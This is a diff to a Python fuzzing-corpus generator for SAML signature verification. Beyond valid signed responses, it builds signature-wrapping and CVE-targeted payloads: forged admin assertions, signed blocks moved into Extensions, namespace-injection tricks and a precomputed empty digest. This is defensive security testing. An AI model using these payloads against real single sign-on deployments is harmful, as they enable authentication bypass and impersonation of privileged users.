@@ -1,19 +1,23 @@
 """Generate seed corpus of signed SAML Responses for differential fuzzing.
 
 Produces:
-  1. Valid baseline responses (various NameIDs, algorithms)
+  1. Valid baseline responses (various NameIDs, algorithms, structures)
   2. XSW attack variants (XSW1-XSW8 applied to valid responses)
   3. C14N edge cases (comment injection, relative namespace)
   4. Signature manipulation variants (stripped, algo-swapped)
   5. DOCTYPE injection variants
+  6. CVE gap seeds (CVE-2026-25922, CVE-2025-54369, CVE-2025-66567/68, Fragile Lock)
 
 All valid responses are signed with the test IdP key from saml_fixtures/.
 """
 
 from __future__ import annotations
 
+import base64
 import copy
+import hashlib
 import os
+import re as _re
 import sys
 from datetime import datetime, timedelta, timezone
 
@@ -165,8 +169,102 @@ def _sign_assertion(resp: etree._Element, key_pem: bytes, cert_pem: bytes) -> et
     return resp
 
 
+def _sign_assertion_opts(
+    resp: etree._Element,
+    key_pem: bytes,
+    cert_pem: bytes,
+    sig_algo: str = "RSA_SHA256",
+    digest_algo: str = "SHA256",
+    c14n: str = "EXCLUSIVE_XML_CANONICALIZATION_1_0",
+) -> etree._Element:
+    """Sign the Assertion with configurable algorithms."""
+    from signxml import XMLSigner
+    from signxml.algorithms import (
+        CanonicalizationMethod,
+        DigestAlgorithm,
+        SignatureConstructionMethod,
+        SignatureMethod,
+    )
+
+    assertion = resp.find(f"{{{SAML_NS}}}Assertion")
+    if assertion is None:
+        return resp
+
+    # Allow SHA1 for seed generation (testing legacy algorithm compatibility)
+    _orig_check = XMLSigner.check_deprecated_methods
+    XMLSigner.check_deprecated_methods = lambda self: None
+    try:
+        signer = XMLSigner(
+            method=SignatureConstructionMethod.enveloped,
+            signature_algorithm=getattr(SignatureMethod, sig_algo),
+            digest_algorithm=getattr(DigestAlgorithm, digest_algo),
+            c14n_algorithm=getattr(CanonicalizationMethod, c14n),
+        )
+    finally:
+        XMLSigner.check_deprecated_methods = _orig_check
+
+    signed_assertion = signer.sign(assertion, key=key_pem, cert=cert_pem)
+
+    parent = assertion.getparent()
+    idx = list(parent).index(assertion)
+    parent.remove(assertion)
+    parent.insert(idx, signed_assertion)
+
+    return resp
+
+
+def _sign_response_level(
+    resp: etree._Element,
+    key_pem: bytes,
+    cert_pem: bytes,
+) -> etree._Element:
+    """Sign the entire Response (not just the Assertion)."""
+    from signxml import XMLSigner
+    from signxml.algorithms import (
+        CanonicalizationMethod,
+        DigestAlgorithm,
+        SignatureConstructionMethod,
+        SignatureMethod,
+    )
+
+    signer = XMLSigner(
+        method=SignatureConstructionMethod.enveloped,
+        signature_algorithm=SignatureMethod.RSA_SHA256,
+        digest_algorithm=DigestAlgorithm.SHA256,
+        c14n_algorithm=CanonicalizationMethod.EXCLUSIVE_XML_CANONICALIZATION_1_0,
+    )
+
+    return signer.sign(resp, key=key_pem, cert=cert_pem)
+
+
+def _move_signature_position(resp: etree._Element, position: str) -> None:
+    """Move the ds:Signature element within the Assertion.
+
+    position: 'after_subject', 'last'
+    Default signxml puts it right after Issuer.
+    """
+    assertion = resp.find(f"{{{SAML_NS}}}Assertion")
+    if assertion is None:
+        return
+    sig = assertion.find(f"{{{DS_NS}}}Signature")
+    if sig is None:
+        return
+
+    assertion.remove(sig)
+    if position == "after_subject":
+        subject = assertion.find(f"{{{SAML_NS}}}Subject")
+        if subject is not None:
+            idx = list(assertion).index(subject) + 1
+            assertion.insert(idx, sig)
+        else:
+            assertion.append(sig)
+    elif position == "last":
+        assertion.append(sig)
+
+
 def _to_xml(root: etree._Element) -> bytes:
-    return etree.tostring(root, xml_declaration=True, encoding="UTF-8", pretty_print=True)
+    # MUST NOT use pretty_print=True: it adds whitespace that breaks signatures
+    return etree.tostring(root, xml_declaration=True, encoding="UTF-8")
 
 
 def _write_seed(path: str, content: bytes) -> None:
@@ -536,6 +634,264 @@ def generate_structure_seeds(seeds, output_dir):
     _write_seed(os.path.join(output_dir, "go_duplicate_attr.xml"), g1.encode())
 
 
+def generate_valid_seeds_extended(key_pem, cert_pem, output_dir):
+    """Generate validly-signed seeds with diverse algorithms and structures."""
+    seeds = []
+
+    def _make(filename, **kwargs):
+        """Build, sign, and write a seed. Returns (resp, xml_bytes)."""
+        sig_algo = kwargs.pop("sig_algo", "RSA_SHA256")
+        digest_algo = kwargs.pop("digest_algo", "SHA256")
+        c14n = kwargs.pop("c14n", "EXCLUSIVE_XML_CANONICALIZATION_1_0")
+        sig_level = kwargs.pop("sig_level", "assertion")
+        sig_position = kwargs.pop("sig_position", None)
+        extra_audiences = kwargs.pop("extra_audiences", None)
+        subject_method = kwargs.pop("subject_method", None)
+        extensions_xml = kwargs.pop("extensions_xml", None)
+
+        resp = _build_response(**kwargs)
+
+        # Multiple audiences
+        if extra_audiences:
+            assertion = resp.find(f"{{{SAML_NS}}}Assertion")
+            aud_restrict = assertion.find(f".//{{{SAML_NS}}}AudienceRestriction")
+            if aud_restrict is not None:
+                for aud_val in extra_audiences:
+                    aud = etree.SubElement(aud_restrict, f"{{{SAML_NS}}}Audience")
+                    aud.text = aud_val
+
+        # SubjectConfirmation method override
+        if subject_method:
+            assertion = resp.find(f"{{{SAML_NS}}}Assertion")
+            sc = assertion.find(f".//{{{SAML_NS}}}SubjectConfirmation")
+            if sc is not None:
+                sc.set("Method", subject_method)
+
+        # Extensions element
+        if extensions_xml:
+            status = resp.find(f"{{{SAMLP_NS}}}Status")
+            idx = list(resp).index(status)
+            ext = etree.Element(f"{{{SAMLP_NS}}}Extensions")
+            ext.text = extensions_xml
+            resp.insert(idx + 1, ext)
+
+        # Sign
+        if sig_level == "assertion":
+            resp = _sign_assertion_opts(resp, key_pem, cert_pem, sig_algo, digest_algo, c14n)
+            if sig_position:
+                _move_signature_position(resp, sig_position)
+        elif sig_level == "response":
+            resp = _sign_response_level(resp, key_pem, cert_pem)
+        elif sig_level == "both":
+            resp = _sign_assertion_opts(resp, key_pem, cert_pem, sig_algo, digest_algo, c14n)
+            resp = _sign_response_level(resp, key_pem, cert_pem)
+
+        xml_bytes = _to_xml(resp)
+        _write_seed(os.path.join(output_dir, filename), xml_bytes)
+        seeds.append((resp, xml_bytes))
+
+    # --- Algorithm diversity (4) ---
+    _make("valid_rsa_sha1.xml",
+           nameid="sha1-user@example.com",
+           sig_algo="RSA_SHA1", digest_algo="SHA1",
+           response_id="_resp_sha1", assertion_id="_assert_sha1")
+
+    _make("valid_rsa_sha384.xml",
+           nameid="sha384-user@example.com",
+           sig_algo="RSA_SHA384", digest_algo="SHA384",
+           response_id="_resp_sha384", assertion_id="_assert_sha384")
+
+    _make("valid_rsa_sha512.xml",
+           nameid="sha512-user@example.com",
+           sig_algo="RSA_SHA512", digest_algo="SHA512",
+           response_id="_resp_sha512", assertion_id="_assert_sha512")
+
+    _make("valid_c14n_inclusive.xml",
+           nameid="inclusive-c14n@example.com",
+           c14n="CANONICAL_XML_1_0",
+           response_id="_resp_c14n_inc", assertion_id="_assert_c14n_inc")
+
+    # --- Structural diversity (5) ---
+    _make("valid_response_sig.xml",
+           nameid="response-sig@example.com",
+           sig_level="response",
+           response_id="_resp_rsig", assertion_id="_assert_rsig")
+
+    _make("valid_dual_sig.xml",
+           nameid="dual-sig@example.com",
+           sig_level="both",
+           response_id="_resp_dual", assertion_id="_assert_dual")
+
+    _make("valid_no_attributes.xml",
+           nameid="minimal@example.com",
+           attributes=None,
+           response_id="_resp_min", assertion_id="_assert_min")
+
+    _make("valid_multiple_audience.xml",
+           nameid="multi-aud@example.com",
+           extra_audiences=["https://sp2.example.com", "https://sp3.example.com"],
+           response_id="_resp_maud", assertion_id="_assert_maud")
+
+    _make("valid_holder_of_key.xml",
+           nameid="hok-user@example.com",
+           subject_method="urn:oasis:names:tc:SAML:2.0:cm:holder-of-key",
+           response_id="_resp_hok", assertion_id="_assert_hok")
+
+    # --- Signature position diversity (3) ---
+    _make("valid_sig_after_subject.xml",
+           nameid="sig-after-subj@example.com",
+           sig_position="after_subject",
+           response_id="_resp_sigpos1", assertion_id="_assert_sigpos1")
+
+    _make("valid_sig_last.xml",
+           nameid="sig-last@example.com",
+           sig_position="last",
+           response_id="_resp_siglast", assertion_id="_assert_siglast")
+
+    _make("valid_with_extensions.xml",
+           nameid="ext-user@example.com",
+           extensions_xml="extended-data",
+           response_id="_resp_ext", assertion_id="_assert_ext")
+
+    # --- Content diversity (3) ---
+    _make("valid_long_nameid.xml",
+           nameid="very-long-username-that-exceeds-normal-length-" + "x" * 80 + "@example.com",
+           response_id="_resp_long", assertion_id="_assert_long")
+
+    many_attrs = {f"attr_{i}": f"value_{i}" for i in range(10)}
+    _make("valid_many_attributes.xml",
+           nameid="many-attrs@example.com",
+           attributes=many_attrs,
+           response_id="_resp_mattr", assertion_id="_assert_mattr")
+
+    _make("valid_special_chars.xml",
+           nameid="user&amp;test<>@example.com",
+           response_id="_resp_special", assertion_id="_assert_special")
+
+    return seeds
+
+
+def generate_cve_gap_seeds(seeds, key_pem, cert_pem, output_dir):
+    """Generate seeds targeting specific CVE gaps (G1-G5)."""
+    if not seeds:
+        return
+    _, base_xml = seeds[0]
+    base_str = base_xml.decode("utf-8")
+
+    # === G1: CVE-2026-25922 — First-Assertion Extraction ===
+    # Evil assertion FIRST with full structure (Issuer, Conditions, Subject)
+    # to look like a "valid" assertion to extraction logic
+    evil_full = (
+        '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
+        ' Version="2.0" ID="_evil_first" IssueInstant="2026-01-01T00:00:00Z">'
+        '<saml:Issuer>https://idp.example.com</saml:Issuer>'
+        '<saml:Subject>'
+        '<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
+        'admin@example.com</saml:NameID>'
+        '<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
+        '<saml:SubjectConfirmationData NotOnOrAfter="2030-12-31T23:59:59Z"'
+        ' Recipient="https://sp.example.com/acs"/>'
+        '</saml:SubjectConfirmation>'
+        '</saml:Subject>'
+        '<saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2030-12-31T23:59:59Z">'
+        '<saml:AudienceRestriction><saml:Audience>https://sp.example.com</saml:Audience>'
+        '</saml:AudienceRestriction></saml:Conditions>'
+        '<saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">'
+        '<saml:AuthnContext><saml:AuthnContextClassRef>'
+        'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport'
+        '</saml:AuthnContextClassRef></saml:AuthnContext>'
+        '</saml:AuthnStatement>'
+        '</saml:Assertion>\n'
+    )
+    g1 = base_str.replace("<saml:Assertion ", evil_full + "<saml:Assertion ", 1)
+    _write_seed(os.path.join(output_dir, "cve_2026_25922_first_extract.xml"), g1.encode())
+
+    # === G2: CVE-2025-54369 — Signed Assertion in Extensions ===
+    # Move signed assertion into Extensions, put evil in its place
+    sig_assertion_match = _re.search(
+        r'(<saml:Assertion\b[^>]*>.*?</saml:Assertion>)',
+        base_str, flags=_re.DOTALL,
+    )
+    if sig_assertion_match:
+        signed_block = sig_assertion_match.group(1)
+        evil_replacement = (
+            '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
+            ' Version="2.0" ID="_evil_ext" IssueInstant="2026-01-01T00:00:00Z">'
+            '<saml:Issuer>https://idp.example.com</saml:Issuer>'
+            '<saml:Subject><saml:NameID>admin@example.com</saml:NameID></saml:Subject>'
+            '</saml:Assertion>'
+        )
+        # Put signed assertion in Extensions before Status
+        extensions_block = '<samlp:Extensions>' + signed_block + '</samlp:Extensions>'
+        # Replace the signed assertion with evil one
+        g2 = base_str.replace(signed_block, evil_replacement, 1)
+        # Insert Extensions after Status
+        g2 = g2.replace('</samlp:Status>', '</samlp:Status>\n' + extensions_block, 1)
+        _write_seed(os.path.join(output_dir, "cve_2025_54369_sig_in_ext.xml"), g2.encode())
+
+    # Also try StatusDetail variant
+    if sig_assertion_match:
+        signed_block = sig_assertion_match.group(1)
+        detail_block = '<samlp:StatusDetail>' + signed_block + '</samlp:StatusDetail>'
+        g2b = base_str.replace(signed_block, evil_replacement, 1)
+        g2b = g2b.replace('</samlp:Status>',
+                          detail_block + '</samlp:Status>', 1)
+        _write_seed(os.path.join(output_dir, "cve_2025_54369_sig_in_status.xml"), g2b.encode())
+
+    # === G3: CVE-2025-66567 — Reserved NS Attribute Injection ===
+    # Add xml:xmlns='...' to Signature (visible to REXML, ignored by Nokogiri)
+    g3 = base_str.replace(
+        '<ds:Signature ',
+        '<ds:Signature xml:xmlns="http://www.w3.org/2000/09/xmldsig#" ',
+        1,
+    )
+    _write_seed(os.path.join(output_dir, "cve_2025_66567_reserved_ns.xml"), g3.encode())
+
+    # Variant: xml:xmlns on Assertion
+    g3b = base_str.replace(
+        '<saml:Assertion ',
+        '<saml:Assertion xml:xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ',
+        1,
+    )
+    _write_seed(os.path.join(output_dir, "cve_2025_66567_reserved_ns_assertion.xml"), g3b.encode())
+
+    # === G4: CVE-2025-66568 — Void C14N Digest Precomputation ===
+    # Relative NS URI + precomputed SHA-256("") digest
+    empty_digest = base64.b64encode(hashlib.sha256(b"").digest()).decode()
+    g4 = base_str.replace(
+        '<saml:Assertion ',
+        '<saml:Assertion xmlns:voidns="1" ',
+        1,
+    )
+    # Replace DigestValue with precomputed empty-string digest
+    g4 = _re.sub(
+        r'<ds:DigestValue>[^<]+</ds:DigestValue>',
+        f'<ds:DigestValue>{empty_digest}</ds:DigestValue>',
+        g4, count=1,
+    )
+    _write_seed(os.path.join(output_dir, "cve_2025_66568_void_digest.xml"), g4.encode())
+
+    # === G5: PortSwigger Fragile Lock — NS-Prefixed Attribute Duplication ===
+    # ID="original" + saml:ID="evil" on Assertion
+    assertion_id_match = _re.search(r'<saml:Assertion[^>]*\sID="([^"]+)"', base_str)
+    if assertion_id_match:
+        orig_id = assertion_id_match.group(1)
+        g5 = base_str.replace(
+            f'ID="{orig_id}"',
+            f'ID="{orig_id}" saml:ID="_evil_dup"',
+            1,
+        )
+        _write_seed(os.path.join(output_dir, "fragile_lock_ns_attr_dup.xml"), g5.encode())
+
+        # Variant: samlp:ID
+        g5b = base_str.replace(
+            f'ID="{orig_id}"',
+            f'ID="{orig_id}" samlp:ID="_evil_dup2"',
+            1,
+        )
+        _write_seed(os.path.join(output_dir, "fragile_lock_ns_attr_dup2.xml"), g5b.encode())
+
+
 def main():
     os.makedirs(SEEDS_DIR, exist_ok=True)
 
@@ -583,6 +939,12 @@ def main():
 
     print("\n--- Structural attack seeds ---")
     generate_structure_seeds(seeds, SEEDS_DIR)
+
+    print("\n--- Extended valid seeds (algorithm/structure diversity) ---")
+    ext_seeds = generate_valid_seeds_extended(key_pem, cert_pem, SEEDS_DIR)
+
+    print("\n--- CVE gap seeds (G1-G5) ---")
+    generate_cve_gap_seeds(seeds, key_pem, cert_pem, SEEDS_DIR)
 
     total = len([f for f in os.listdir(SEEDS_DIR) if f.endswith(".xml")])
     print(f"\nDone. {total} seed files in {SEEDS_DIR}")
